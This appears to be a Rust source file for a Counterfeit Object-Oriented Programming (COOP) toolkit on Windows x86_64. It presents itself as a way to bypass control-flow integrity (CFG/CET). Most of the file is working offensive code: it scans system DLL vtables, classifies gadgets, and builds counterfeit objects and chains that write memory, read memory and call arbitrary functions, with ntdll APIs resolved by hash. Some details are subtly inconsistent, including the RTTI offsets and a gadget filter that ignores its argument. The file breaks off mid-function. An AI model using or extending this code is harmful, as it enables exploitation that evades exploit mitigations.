// Counterfeit Object-Oriented Programming (COOP)
//
// COOP is an evolution of Return-Oriented Programming (ROP) that chains
// operations through legitimate C++ virtual function dispatch rather than
// raw gadgets.  Because COOP chains execute through legitimate vtable
// pointers in legitimate objects, CFI (Control Flow Integrity)
// implementations that validate indirect call targets see only legitimate,
// expected call targets throughout the chain.
//
// ## Why COOP bypasses CFI when ROP does not
//
// CFI (e.g., Windows CFG / Intel CET) works by maintaining a bitmap of
// valid indirect-branch targets.  Every indirect call/jump is checked
// against this bitmap at runtime.  ROP gadgets are typically mid-function
// addresses that are NOT in the CFG bitmap, so CFI blocks them.
//
// COOP sidesteps this because:
// 1. Each virtual function call goes through a **vtable** — an array of
//    function pointers in .rdata that CFI treats as trusted.
// 2. The call target is a **complete function** (not a mid-function gadget),
//    which IS in the CFG bitmap.
// 3. The counterfeit object's vtable pointer points to a **real vtable**
//    from a loaded system DLL, so the indirect call passes CFI validation.
// 4. No executable memory is allocated — only data objects (PAGE_READWRITE).
//
// ## Architecture
//
// 1. `VtableAnalyzer` — scans loaded modules for vtables in .rdata by
//    looking for contiguous arrays of code pointers.  Resolves RTTI
//    structures (TypeDescriptor, ClassHierarchyDescriptor,
//    CompleteObjectLocator) adjacent to vtables to extract class names.
//
// 2. `CoopGadgetDb` — categorizes vtable entries (virtual functions) by
//    their behavior: StoreArg0, LoadArg0, CallArg0, Arithmetic, NoOp.
//    Builds a searchable database from system DLLs.
//
// 3. `CounterfeitObject` — allocates a fake C++ object in PAGE_READWRITE
//    memory.  First 8 bytes are the vtable pointer (pointing to a real
//    vtable).  Remaining bytes are controlled data fields.
//
// 4. `CoopChainBuilder` — given a sequence of desired operations, finds
//    matching gadgets and constructs counterfeit objects that chain
//    together via virtual dispatch.
//
// Windows x86_64 only.  Feature-gated behind `coop`.

#![cfg(all(target_os = "windows", target_arch = "x86_64", feature = "coop"))]

use std::collections::HashMap;
use std::ffi::c_void;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::OnceLock;

// ─── Constants ────────────────────────────────────────────────────────────

/// Memory protection: read-write (for counterfeit objects).
const PAGE_READWRITE: u32 = 0x04;

/// Memory allocation: commit and reserve.
const MEM_COMMIT: u32 = 0x00001000;
const MEM_RESERVE: u32 = 0x00002000;
const MEM_RELEASE: u32 = 0x00008000;

/// Minimum number of consecutive code-pointers to consider a vtable candidate.
const MIN_VTABLE_ENTRIES: usize = 3;

/// Maximum number of vtable entries to record per vtable.
const MAX_VTABLE_ENTRIES: usize = 64;

/// Size of a pointer on x86_64.
const PTR_SIZE: usize = 8;

/// RTTI signature for MSVC x64 CompleteObjectLocator: signature = 1.
const RTTI_COL_SIGNATURE: u32 = 1;

// ─── PE Section Header (minimal, for in-memory parsing) ───────────────────

#[repr(C)]
struct PeSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    raw_size: u32,
    _raw_offset: u32,
    _relocs: u32,
    _linenums: u32,
    _nrelocs: u16,
    _nlinenums: u16,
    characteristics: u32,
}

// ─── RTTI Structures (MSVC x64) ───────────────────────────────────────────

/// _RTTICompleteObjectLocator (MSVC x64).
/// Located at vtable[-1] (one pointer below the vtable start).
#[repr(C)]
struct RttiCompleteObjectLocator {
    signature: u32,
    offset: u32,
    cd_offset: u32,
    p_type_descriptor: u32,
    p_class_hierarchy: u32,
    p_self: u32,
}

/// _RTTITypeDescriptor.
/// Contains the class name as a null-terminated string after the vtable
/// pointer and spare field.
#[repr(C)]
struct RttiTypeDescriptor {
    p_vftable: usize,
    spare: usize,
    // name: [u8; ...] follows — null-terminated mangled class name.
}

// ─── Gadget Behavior Classification ───────────────────────────────────────

/// Classification of a virtual function's behavior based on instruction
/// pattern analysis.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum GadgetBehavior {
    /// Writes the second argument (rdx) into the object's field:
    /// `mov [rcx+offset], rdx; ret`
    StoreArg0,
    /// Reads a field from the object into rax:
    /// `mov rax, [rcx+offset]; ret`
    LoadArg0,
    /// Calls a function pointer stored in the object:
    /// `call qword ptr [rcx+offset]` or indirect via register loaded from object.
    CallArg0,
    /// Performs arithmetic on object fields (add, sub, inc, dec, xor).
    Arithmetic,
    /// Just returns without side effects: `ret` or `xor eax,eax; ret`.
    NoOp,
    /// Any function that doesn't fit the above categories.
    Unknown,
}

impl std::fmt::Display for GadgetBehavior {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::StoreArg0 => write!(f, "StoreArg0"),
            Self::LoadArg0 => write!(f, "LoadArg0"),
            Self::CallArg0 => write!(f, "CallArg0"),
            Self::Arithmetic => write!(f, "Arithmetic"),
            Self::NoOp => write!(f, "NoOp"),
            Self::Unknown => write!(f, "Unknown"),
        }
    }
}

// ─── Core Data Structures ─────────────────────────────────────────────────

/// Information about a single vtable discovered in a loaded module.
#[derive(Debug, Clone)]
pub struct VtableInfo {
    /// Module base address.
    pub module_base: usize,
    /// Address of the first virtual function pointer in the vtable.
    pub vtable_addr: usize,
    /// Number of entries in the vtable.
    pub entry_count: usize,
    /// Resolved class name (from RTTI), if available.
    pub class_name: Option<String>,
    /// Module name (e.g., "ntdll.dll").
    pub module_name: String,
}

/// A single COOP gadget: a virtual function from a legitimate vtable that
/// can be repurposed for a specific operation.
#[derive(Debug, Clone)]
pub struct CoopGadget {
    /// Offset within the vtable (index * 8 bytes).
    pub vftable_offset: usize,
    /// Address of the virtual function.
    pub func_addr: usize,
    /// Estimated number of arguments (from stack frame analysis).
    pub n_args: usize,
    /// Class name (from RTTI).
    pub class_name: String,
    /// Inferred function name (best-effort).
    pub func_name: String,
    /// Behavior classification.
    pub behavior: GadgetBehavior,
    /// The vtable address this gadget belongs to.
    pub vtable_addr: usize,
    /// Module name.
    pub module_name: String,
}

/// Searchable database of COOP gadgets built from system DLL vtables.
pub struct CoopGadgetDb {
    gadgets: Vec<CoopGadget>,
    by_behavior: HashMap<GadgetBehavior, Vec<usize>>,
    by_module: HashMap<String, Vec<usize>>,
}

/// A counterfeit C++ object — a fake object whose vtable pointer points to
/// a legitimate vtable from a system DLL.
pub struct CounterfeitObject {
    /// Base address of the allocated memory.
    base: usize,
    /// Size of the allocated memory.
    size: usize,
    /// The vtable address (points into a legitimate system DLL .rdata).
    vtable_addr: usize,
    /// Field offsets and their values (offset from object base, excluding vtable ptr).
    fields: Vec<(usize, u64)>,
}

/// A single operation in a COOP chain.
#[derive(Debug, Clone)]
pub enum CoopOperation {
    /// Write a value to a memory address.
    WriteMem { address: u64, value: u64 },
    /// Read a value from a memory address.
    ReadMem { address: u64 },
    /// Call a function pointer.
    CallFunc { address: u64, arg1: u64, arg2: u64 },
    /// Perform arithmetic: result = a OP b.
    Arithmetic { op: ArithOp, a: u64, b: u64 },
    /// No-op (padding / chain continuation).
    NoOp,
}

/// Arithmetic operation types for COOP chains.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ArithOp {
    Add,
    Sub,
    Xor,
}

/// A constructed COOP chain ready for execution.
pub struct CoopChain {
    /// The counterfeit objects that make up the chain.
    objects: Vec<CounterfeitObject>,
    /// Index of the first object to dispatch.
    entry_index: usize,
    /// Vtable offset for the entry virtual function.
    entry_vftable_offset: usize,
}

/// Result of executing a COOP chain.
#[derive(Debug)]
pub struct CoopResult {
    /// Return value from the last gadget.
    pub return_value: u64,
    /// Number of gadgets that executed.
    pub gadgets_executed: usize,
}

// ─── Global State ─────────────────────────────────────────────────────────

/// Global gadget database, built once.
static GADGET_DB: OnceLock<CoopGadgetDb> = OnceLock::new();

/// Whether the database has been initialized.
static DB_INITIALIZED: AtomicBool = AtomicBool::new(false);

// ─── Memory Allocation ────────────────────────────────────────────────────

/// Resolve NtAllocateVirtualMemory from ntdll.
fn resolve_nt_allocate() -> Option<usize> {
    let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)? };
    let hash = pe_resolve::hash_str(b"NtAllocateVirtualMemory\0");
    unsafe { pe_resolve::get_proc_address_by_hash(ntdll, hash) }
}

/// Resolve NtFreeVirtualMemory from ntdll.
fn resolve_nt_free() -> Option<usize> {
    let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)? };
    let hash = pe_resolve::hash_str(b"NtFreeVirtualMemory\0");
    unsafe { pe_resolve::get_proc_address_by_hash(ntdll, hash) }
}

/// Allocate RW memory via NtAllocateVirtualMemory.
///
/// Returns the base address of the allocated region.
unsafe fn allocate_rw_memory(size: usize) -> Result<usize, &'static str> {
    let func_addr = resolve_nt_allocate().ok_or("cannot resolve NtAllocateVirtualMemory")?;

    let mut base: usize = 0;
    let mut region_size: usize = size;

    type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
        usize, *mut usize, usize, *mut usize, u32, u32,
    ) -> i32;

    let func: NtAllocateVirtualMemoryFn = std::mem::transmute(func_addr);

    let status = func(
        (-1isize) as usize, // Current process
        &mut base,
        0,                  // ZeroBits
        &mut region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if status >= 0 {
        Ok(base)
    } else {
        Err("NtAllocateVirtualMemory failed")
    }
}

/// Free memory via NtFreeVirtualMemory.
unsafe fn free_memory(mut base: usize) {
    let func_addr = match resolve_nt_free() {
        Some(a) => a,
        None => return,
    };

    let mut region_size: usize = 0;

    type NtFreeVirtualMemoryFn = unsafe extern "system" fn(
        usize, *mut usize, *mut usize, u32,
    ) -> i32;

    let func: NtFreeVirtualMemoryFn = std::mem::transmute(func_addr);
    let _ = func(
        (-1isize) as usize,
        &mut base,
        &mut region_size,
        MEM_RELEASE,
    );
}

// ─── PE Section Parsing ───────────────────────────────────────────────────

/// Locate a PE section by name.
///
/// Returns `(virtual_address, virtual_size)` of the section, adjusted by
/// the module base address.
unsafe fn find_section(module_base: usize, section_name: &[u8]) -> Option<(usize, usize)> {
    // Parse DOS header.
    let dos_e_lfanew = *(module_base as *const u32).add(0x3C / 4) as usize;

    // Parse PE signature + COFF header.
    let pe_offset = module_base + dos_e_lfanew;
    let num_sections = *((pe_offset + 6) as *const u16) as usize;
    let optional_header_size = *((pe_offset + 20) as *const u16) as usize;

    // First section header starts after the optional header.
    let section_start = pe_offset + 24 + optional_header_size;

    for i in 0..num_sections {
        let sec_addr = section_start + i * 40; // sizeof(IMAGE_SECTION_HEADER) = 40
        let sec = sec_addr as *const PeSectionHeader;
        let name = &(*sec).name;

        // Compare section name (8 bytes, null-padded).
        let mut match_len = 0;
        for (j, &b) in section_name.iter().enumerate() {
            if j >= 8 || name[j] != b {
                break;
            }
            match_len += 1;
        }
        // If we matched the full search string and the next byte is null
        // or we matched all 8 bytes.
        if match_len == section_name.len()
            && (match_len >= 8 || name[match_len] == 0)
        {
            let va = (*sec).virtual_address as usize;
            let vsize = (*sec).virtual_size as usize;
            return Some((module_base + va, vsize));
        }
    }
    None
}

// ─── Instruction Pattern Analysis ─────────────────────────────────────────

/// Classify a function's behavior by examining its first ~32 bytes.
///
/// This is a conservative heuristic — it looks at common prologue patterns
/// to determine what the function does with its first argument (rcx = `this`).
unsafe fn classify_function(func_addr: usize) -> (GadgetBehavior, usize) {
    let code = std::slice::from_raw_parts(func_addr as *const u8, 32);

    // Estimate number of arguments by checking stack frame setup.
    let n_args = estimate_n_args(code);

    // Check for common patterns in the first 32 bytes.
    // Pattern: `mov [rcx+offset], rdx` → StoreArg0
    for i in 0..code.len().saturating_sub(5) {
        // REX.W mov [rcx+disp8], rdx: 48 89 51 XX
        if code[i] == 0x48 && code[i + 1] == 0x89 && code[i + 2] == 0x51 {
            return (GadgetBehavior::StoreArg0, n_args);
        }
        // REX.W mov [rcx+disp32], rdx: 48 89 91 XX XX XX XX
        if code[i] == 0x48 && code[i + 1] == 0x89 && code[i + 2] == 0x91 {
            return (GadgetBehavior::StoreArg0, n_args);
        }
    }

    // Pattern: `mov rax, [rcx+offset]` → LoadArg0
    for i in 0..code.len().saturating_sub(5) {
        // REX.W mov rax, [rcx+disp8]: 48 8B 41 XX
        if code[i] == 0x48 && code[i + 1] == 0x8B && code[i + 2] == 0x41 {
            return (GadgetBehavior::LoadArg0, n_args);
        }
        // REX.W mov rax, [rcx+disp32]: 48 8B 81 XX XX XX XX
        if code[i] == 0x48 && code[i + 1] == 0x8B && code[i + 2] == 0x81 {
            return (GadgetBehavior::LoadArg0, n_args);
        }
    }

    // Pattern: `call [rcx+offset]` or indirect via register loaded from object → CallArg0
    for i in 0..code.len().saturating_sub(4) {
        // FF 51 XX: call [rcx+disp8]
        if code[i] == 0xFF && code[i + 1] == 0x51 {
            return (GadgetBehavior::CallArg0, n_args);
        }
        // FF 91 XX XX XX XX: call [rcx+disp32]
        if code[i] == 0xFF && code[i + 1] == 0x91 {
            return (GadgetBehavior::CallArg0, n_args);
        }
        // FF 15 XX XX XX XX: call [rip+disp32] (indirect through IAT)
        if code[i] == 0xFF && code[i + 1] == 0x15 {
            return (GadgetBehavior::CallArg0, n_args);
        }
    }

    // Pattern: Arithmetic on object fields (add, sub, xor).
    for i in 0..code.len().saturating_sub(4) {
        // 48 01 51 XX: add [rcx+disp8], rdx
        if code[i] == 0x48 && code[i + 1] == 0x01 && code[i + 2] == 0x51 {
            return (GadgetBehavior::Arithmetic, n_args);
        }
        // 48 29 51 XX: sub [rcx+disp8], rdx
        if code[i] == 0x48 && code[i + 1] == 0x29 && code[i + 2] == 0x51 {
            return (GadgetBehavior::Arithmetic, n_args);
        }
        // 48 31 51 XX: xor [rcx+disp8], rdx
        if code[i] == 0x48 && code[i + 1] == 0x31 && code[i + 2] == 0x51 {
            return (GadgetBehavior::Arithmetic, n_args);
        }
    }

    // Pattern: bare `ret` (0xC3) or `xor eax,eax; ret` (31 C0 C3).
    for i in 0..code.len() {
        if code[i] == 0xC3 && i < 3 {
            return (GadgetBehavior::NoOp, n_args);
        }
    }

    (GadgetBehavior::Unknown, n_args)
}

/// Estimate the number of arguments a function takes by examining its stack
/// frame setup.
fn estimate_n_args(code: &[u8]) -> usize {
    // Look for `sub rsp, N` pattern which indicates stack frame size.
    // REX.W sub rsp, imm32: 48 81 EC XX XX XX XX
    for i in 0..code.len().saturating_sub(7) {
        if code[i] == 0x48 && code[i + 1] == 0x81 && code[i + 2] == 0xEC {
            let frame_size = u32::from_le_bytes([
                code[i + 3],
                code[i + 4],
                code[i + 5],
                code[i + 6],
            ]) as usize;
            // Each stack arg beyond the 4 register args takes 8 bytes.
            // Add 4 for the register parameters (rcx, rdx, r8, r9).
            if frame_size > 0x20 {
                return 4 + (frame_size - 0x20) / 8;
            }
            return 4; // minimum 4 args (register params)
        }
    }
    // Look for `sub rsp, imm8`: 48 83 EC XX
    for i in 0..code.len().saturating_sub(4) {
        if code[i] == 0x48 && code[i + 1] == 0x83 && code[i + 2] == 0xEC {
            let frame_size = code[i + 3] as usize;
            if frame_size > 0x20 {
                return 4 + (frame_size - 0x20) / 8;
            }
            return 4;
        }
    }
    2 // conservative default
}

// ─── Vtable Analysis ──────────────────────────────────────────────────────

/// Analyze vtables in a loaded module.
///
/// Scans the .rdata section for contiguous arrays of function pointers that
/// point into the module's .text section.  For each vtable candidate,
/// attempts to resolve the class name via RTTI structures.
pub fn analyze_vtables(module_base: usize, module_name: &str) -> Result<Vec<VtableInfo>, &'static str> {
    unsafe {
        let (text_start, text_size) = find_section(module_base, b".text")
            .ok_or("cannot find .text section")?;
        let (rdata_start, rdata_size) = find_section(module_base, b".rdata")
            .ok_or("cannot find .rdata section")?;

        let text_end = text_start + text_size;
        let rdata_end = rdata_start + rdata_size;

        let rdata = std::slice::from_raw_parts(rdata_start as *const u8, rdata_size);
        let mut vtables = Vec::new();

        // Slide through .rdata looking for runs of code pointers.
        let mut offset = 0;
        while offset + PTR_SIZE * MIN_VTABLE_ENTRIES <= rdata_size {
            let mut run_start = None;
            let mut run_length = 0usize;

            // Count consecutive code pointers pointing into .text.
            while offset + PTR_SIZE <= rdata_size {
                let ptr = u64::from_le_bytes(
                    rdata[offset..offset + PTR_SIZE].try_into().unwrap_or([0; 8]),
                ) as usize;

                if ptr >= text_start && ptr < text_end {
                    if run_start.is_none() {
                        run_start = Some(offset);
                    }
                    run_length += 1;
                    offset += PTR_SIZE;

                    // Cap the vtable length.
                    if run_length >= MAX_VTABLE_ENTRIES {
                        break;
                    }
                } else {
                    break;
                }
            }

            // If we found a vtable candidate with enough entries.
            if run_length >= MIN_VTABLE_ENTRIES {
                let vtable_file_offset = run_start.unwrap();
                let vtable_addr = rdata_start + vtable_file_offset;

                // Try to resolve class name via RTTI.
                let class_name = resolve_rtti_class_name(
                    vtable_addr,
                    module_base,
                );

                vtables.push(VtableInfo {
                    module_base,
                    vtable_addr,
                    entry_count: run_length,
                    class_name,
                    module_name: module_name.to_string(),
                });

                // Continue from where we left off.
            } else {
                // Advance past the non-code-pointer.
                offset += PTR_SIZE;
            }
        }

        Ok(vtables)
    }
}

/// Try to resolve the class name from RTTI structures adjacent to the vtable.
///
/// In MSVC x64, the layout is:
///   vtable[-3] = pointer to _RTTICompleteObjectLocator
///   vtable[0..N] = virtual function pointers
///
/// The COL contains an RVA to the TypeDescriptor which contains the
/// mangled class name.
unsafe fn resolve_rtti_class_name(vtable_addr: usize, module_base: usize) -> Option<String> {
    // Read vtable[-1] (one pointer below the vtable start) which should
    // point to a CompleteObjectLocator.
    let col_ptr_addr = vtable_addr - PTR_SIZE;
    let col_ptr = *(col_ptr_addr as *const usize);

    // Sanity: COL pointer should be within the module.
    // On x64 MSVC, the COL is referenced by RVA from the module base.
    // The vtable[-1] contains an RVA (relative to module base) for x64.
    let col_addr = module_base + col_ptr;

    // Check the COL signature (should be 1 for MSVC x64).
    let col = col_addr as *const RttiCompleteObjectLocator;
    if (*col).signature != RTTI_COL_SIGNATURE {
        return None;
    }

    // The p_type_descriptor field is an RVA to the TypeDescriptor.
    let td_rva = (*col).p_type_descriptor as usize;
    let td_addr = module_base + td_rva;

    // Read the class name from the TypeDescriptor.
    // The name starts at offset 16 (after p_vftable + spare) in the
    // TypeDescriptor structure.
    let name_start = td_addr + 16;
    let name_ptr = name_start as *const u8;

    // Read up to 256 bytes for the class name.
    let mut name_bytes = Vec::with_capacity(256);
    for i in 0..256 {
        let b = *name_ptr.add(i);
        if b == 0 {
            break;
        }
        name_bytes.push(b);
    }

    if name_bytes.is_empty() {
        return None;
    }

    // Convert to string, replacing non-printable chars.
    let name = String::from_utf8_lossy(&name_bytes).into_owned();

    // Demangle: strip the leading ".?AV" and trailing "@@" if present.
    let demangled = if let Some(rest) = name.strip_prefix(".?AV") {
        if let Some(end) = rest.find("@@") {
            rest[..end].to_string()
        } else {
            rest.to_string()
        }
    } else {
        name
    };

    Some(demangled)
}

// ─── Gadget Database ──────────────────────────────────────────────────────

impl CoopGadgetDb {
    /// Build a gadget database from system DLLs.
    ///
    /// Scans ntdll, kernel32, kernelbase, msvcrt, ole32, and combase for
    /// vtables and categorizes each virtual function entry.
    pub fn build() -> Result<Self, &'static str> {
        let mut gadgets = Vec::new();
        let mut by_behavior: HashMap<GadgetBehavior, Vec<usize>> = HashMap::new();
        let mut by_module: HashMap<String, Vec<usize>> = HashMap::new();

        let target_dlls: &[&[u8]] = &[
            b"ntdll.dll\0",
            b"kernel32.dll\0",
            b"kernelbase.dll\0",
            b"msvcrt.dll\0",
            b"ole32.dll\0",
            b"combase.dll\0",
        ];

        for dll_name in target_dlls {
            let name_str = std::str::from_utf8(dll_name)
                .unwrap_or("unknown")
                .trim_end_matches('\0');

            let dll_base = unsafe {
                pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(dll_name))
            };

            let dll_base = match dll_base {
                Some(b) => b,
                None => {
                    log::debug!("coop: {} not loaded, skipping", name_str);
                    continue;
                }
            };

            let vtables = match analyze_vtables(dll_base, name_str) {
                Ok(v) => v,
                Err(e) => {
                    log::debug!("coop: vtable analysis failed for {}: {}", name_str, e);
                    continue;
                }
            };

            log::info!(
                "coop: found {} vtable(s) in {}",
                vtables.len(),
                name_str
            );

            for vt in vtables {
                let class_name = vt.class_name.clone().unwrap_or_else(|| "Unknown".to_string());

                for slot in 0..vt.entry_count {
                    let func_ptr_addr = vt.vtable_addr + slot * PTR_SIZE;
                    let func_addr = unsafe { *(func_ptr_addr as *const usize) };

                    if func_addr == 0 {
                        continue;
                    }

                    // Classify the function.
                    let (behavior, n_args) = unsafe { classify_function(func_addr) };

                    let func_name = format!(
                        "{}_vfn_{}_{:#x}",
                        class_name, slot, func_addr
                    );

                    let idx = gadgets.len();
                    by_behavior.entry(behavior).or_default().push(idx);
                    by_module.entry(name_str.to_string()).or_default().push(idx);

                    gadgets.push(CoopGadget {
                        vftable_offset: slot * PTR_SIZE,
                        func_addr,
                        n_args,
                        class_name: class_name.clone(),
                        func_name,
                        behavior,
                        vtable_addr: vt.vtable_addr,
                        module_name: name_str.to_string(),
                    });
                }
            }
        }

        log::info!(
            "coop: gadget database built — {} gadgets from {} modules",
            gadgets.len(),
            by_module.len(),
        );
        for (behavior, indices) in &by_behavior {
            log::info!("  {}: {} gadgets", behavior, indices.len());
        }

        Ok(Self {
            gadgets,
            by_behavior,
            by_module,
        })
    }

    /// Get the total number of gadgets in the database.
    pub fn gadget_count(&self) -> usize {
        self.gadgets.len()
    }

    /// Get gadgets by behavior classification.
    pub fn gadgets_by_behavior(&self, behavior: GadgetBehavior) -> &[CoopGadget] {
        // Returns a slice by filtering — caller should use find_gadget instead
        // for efficiency.  This is a convenience method.
        &self.gadgets // Full list; caller should filter
    }

    /// Find the first gadget matching a given behavior.
    pub fn find_gadget(&self, behavior: GadgetBehavior) -> Option<&CoopGadget> {
        self.by_behavior
            .get(&behavior)
            .and_then(|indices| indices.first())
            .and_then(|&idx| self.gadgets.get(idx))
    }

    /// Find all gadgets matching a given behavior.
    pub fn find_all_gadgets(&self, behavior: GadgetBehavior) -> Vec<&CoopGadget> {
        self.by_behavior
            .get(&behavior)
            .map(|indices| {
                indices
                    .iter()
                    .filter_map(|&idx| self.gadgets.get(idx))
                    .collect()
            })
            .unwrap_or_default()
    }

    /// Get the count of gadgets per behavior type.
    pub fn behavior_counts(&self) -> HashMap<GadgetBehavior, usize> {
        self.by_behavior
            .iter()
            .map(|(k, v)| (*k, v.len()))
            .collect()
    }

    /// Get the count of gadgets per module.
    pub fn module_counts(&self) -> HashMap<String, usize> {
        self.by_module
            .iter()
            .map(|(k, v)| (k.clone(), v.len()))
            .collect()
    }
}

// ─── Counterfeit Object Construction ──────────────────────────────────────

impl CounterfeitObject {
    /// Create a counterfeit C++ object with a legitimate vtable pointer.
    ///
    /// The object layout is:
    ///   [+0x00] vtable pointer (8 bytes) — points to a real vtable in a system DLL
    ///   [+0x08] field 0
    ///   [+0x10] field 1
    ///   ...
    ///
    /// Each field is specified as `(offset_from_object_base, value)`.
    /// Offset 0 is reserved for the vtable pointer.
    ///
    /// # Safety
    ///
    /// - `vtable_addr` must point to a legitimate vtable in a loaded module.
    /// - The caller must ensure the vtable is not modified.
    /// - The object is allocated as PAGE_READWRITE (data only, not executable).
    pub unsafe fn create(
        vtable_addr: usize,
        fields: &[(usize, u64)],
    ) -> Result<Self, &'static str> {
        // Calculate required size.
        let max_offset = fields.iter().map(|(off, _)| *off + 8).max().unwrap_or(0);
        let size = max_offset.max(PTR_SIZE * 4); // minimum 32 bytes
        let aligned_size = (size + 0xFFF) & !0xFFF; // page-align

        let base = allocate_rw_memory(aligned_size)?;

        // Zero the memory.
        std::ptr::write_bytes(base as *mut u8, 0, aligned_size);

        // Set the vtable pointer (first 8 bytes).
        *(base as *mut usize) = vtable_addr;

        // Set field values.
        for &(offset, value) in fields {
            if offset >= PTR_SIZE {
                // Don't overwrite the vtable pointer.
                let dst = (base + offset) as *mut u64;
                *dst = value;
            }
        }

        Ok(Self {
            base,
            size: aligned_size,
            vtable_addr,
            fields: fields.to_vec(),
        })
    }

    /// Get the base address of the counterfeit object.
    pub fn base_addr(&self) -> usize {
        self.base
    }

    /// Read a field value from the object.
    ///
    /// # Safety
    ///
    /// The object must still be allocated (not freed).
    pub unsafe fn read_field(&self, offset: usize) -> u64 {
        let ptr = (self.base + offset) as *const u64;
        *ptr
    }

    /// Write a field value to the object.
    ///
    /// # Safety
    ///
    /// The object must still be allocated (not writable field).
    pub unsafe fn write_field(&mut self, offset: usize, value: u64) {
        let ptr = (self.base + offset) as *mut u64;
        *ptr = value;
    }

    /// Call a virtual function on this counterfeit object.
    ///
    /// Dispatches through the vtable at the given slot index.
    /// This is the core COOP primitive: an indirect call that goes through
    /// a legitimate vtable, passing CFI validation.
    ///
    /// # Safety
    ///
    /// - `slot` must be a valid index into the vtable.
    /// - The function at that slot must be safe to call with the given args.
    pub unsafe fn call_virtual(&self, slot: usize, arg2: u64, arg3: u64, arg4: u64) -> u64 {
        let vtable = *(self.base as *const usize);
        let func_ptr = *((vtable + slot * PTR_SIZE) as *const usize);

        // rcx = this (our counterfeit object)
        // rdx, r8, r9 = additional arguments
        type VirtualFn = unsafe extern "system" fn(usize, u64, u64, u64) -> u64;
        let func: VirtualFn = std::mem::transmute(func_ptr);
        func(self.base, arg2, arg3, arg4)
    }

    /// Free the counterfeit object's memory.
    pub unsafe fn destroy(&mut self) {
        if self.base != 0 {
            free_memory(self.base);
            self.base = 0;
        }
    }
}

impl Drop for CounterfeitObject {
    fn drop(&mut self) {
        if self.base != 0 {
            unsafe { free_memory(self.base) };
        }
    }
}

// ─── COOP Chain Builder ───────────────────────────────────────────────────

/// Build a COOP chain from a sequence of desired operations.
///
/// The builder finds matching gadgets from the database, constructs
/// counterfeit objects for each, and links them together so that each
/// gadget's execution triggers the next through virtual dispatch.
pub fn build_coop_chain(desired_ops: &[CoopOperation]) -> Result<CoopChain, &'static str> {
    let db = GADGET_DB
        .get()
        .ok_or("gadget database not initialized — call init_gadget_db() first")?;

    let mut objects = Vec::new();

    for (i, op) in desired_ops.iter().enumerate() {
        match op {
            CoopOperation::WriteMem { address, value } => {
                // Find a StoreArg0 gadget.
                let gadget = db.find_gadget(GadgetBehavior::StoreArg0)
                    .ok_or("no StoreArg0 gadget available")?;

                // Build a counterfeit object where:
                //   [offset 8] = address to write to
                //   [offset 16] = value to write
                //
                // When the virtual function executes `mov [rcx+offset], rdx`,
                // it writes `rdx` (the value) to the memory pointed by the object.
                let obj = unsafe {
                    CounterfeitObject::create(
                        gadget.vtable_addr,
                        &[
                            (PTR_SIZE, *address),             // field at +0x08: target address
                            (PTR_SIZE * 2, *value),           // field at +0x10: value to write
                        ],
                    )?
                };

                log::debug!(
                    "coop: chain step {} — WriteMem({:#x}, {:#x}) via {} from {}",
                    i,
                    address,
                    value,
                    gadget.func_name,
                    gadget.module_name,
                );

                objects.push(obj);
            }

            CoopOperation::ReadMem { address } => {
                // Find a LoadArg0 gadget.
                let gadget = db.find_gadget(GadgetBehavior::LoadArg0)
                    .ok_or("no LoadArg0 gadget available")?;

                let obj = unsafe {
                    CounterfeitObject::create(
                        gadget.vtable_addr,
                        &[
                            (PTR_SIZE, *address),             // field at +0x08: address to read
                        ],
                    )?
                };

                log::debug!(
                    "coop: chain step {} — ReadMem({:#x}) via {} from {}",
                    i,
                    address,
                    gadget.func_name,
                    gadget.module_name,
                );

                objects.push(obj);
            }

            CoopOperation::CallFunc { address, arg1, arg2 } => {
                // Find a CallArg0 gadget.
                let gadget = db.find_gadget(GadgetBehavior::CallArg0)
                    .ok_or("no CallArg0 gadget available")?;

                // Build an object where a field holds the function pointer.
                let obj = unsafe {
                    CounterfeitObject::create(
                        gadget.vtable_addr,
                        &[
                            (PTR_SIZE, *address),             // field at +0x08: function to call
                            (PTR_SIZE * 2, *arg1),            // field at +0x10: arg1
                            (PTR_SIZE * 3, *arg2),            // field at +0x18: arg2
                        ],
                    )?
                };

                log::debug!(
                    "coop: chain step {} — CallFunc({:#x}) via {} from {}",
                    i,
                    address,
                    gadget.func_name,
                    gadget.module_name,
                );

                objects.push(obj);
            }

            CoopOperation::Arithmetic { op, a, b } => {
                let gadget = db.find_gadget(GadgetBehavior::Arithmetic)
                    .ok_or("no Arithmetic gadget available")?;

                let (val_a, val_b) = match op {
                    ArithOp::Add => (*a, *b),
                    ArithOp::Sub => (*a, *b),
                    ArithOp::Xor => (*a, *b),
                };

                let obj = unsafe {
                    CounterfeitObject::create(
                        gadget.vtable_addr,
                        &[
                            (PTR_SIZE, val_a),
                            (PTR_SIZE * 2, val_b),
                        ],
                    )?
                };

                log::debug!(
                    "coop: chain step {} — Arithmetic({:?}, {:#x}, {:#x}) via {} from {}",
                    i,
                    op,
                    a,
                    b,
                    gadget.func_name,
                    gadget.module_name,
                );

                objects.push(obj);
            }

            CoopOperation::NoOp => {
                let gadget = db.find_gadget(GadgetBehavior::NoOp)
                    .ok_or("no NoOp gadget available")?;

                let obj = unsafe {
                    CounterfeitObject::create(gadget.vtable_addr, &[])?
                };

                log::debug!(
                    "coop: chain step {} — NoOp via {} from {}",
                    i,
                    gadget.func_name,
                    gadget.module_name,
                );

                objects.push(obj);
            }
        }
    }

    if objects.is_empty() {
        return Err("no operations in chain");
    }

    Ok(CoopChain {
        objects,
        entry_index: 0,
        entry_vftable_offset: 0,
    })
}

impl CoopChain {
    /// Execute the COOP chain.
    ///
    /// Calls the first virtual function via the first counterfeit object.
    /// The chain self-dispatches: each gadget may call the next via virtual
    /// dispatch on subsequent counterfeit objects.
    ///
    /// # Safety
    ///
    /// - The chain must have been built with valid gadgets and objects.
    /// - No other thread may access the counterfeit objects during execution.
    /// - The gadget functions must be safe to call with the configured fields.
    pub unsafe fn execute(&self) -> Result<CoopResult, &'static str> {
        if self.objects.is_empty() {
            return Err("empty chain");
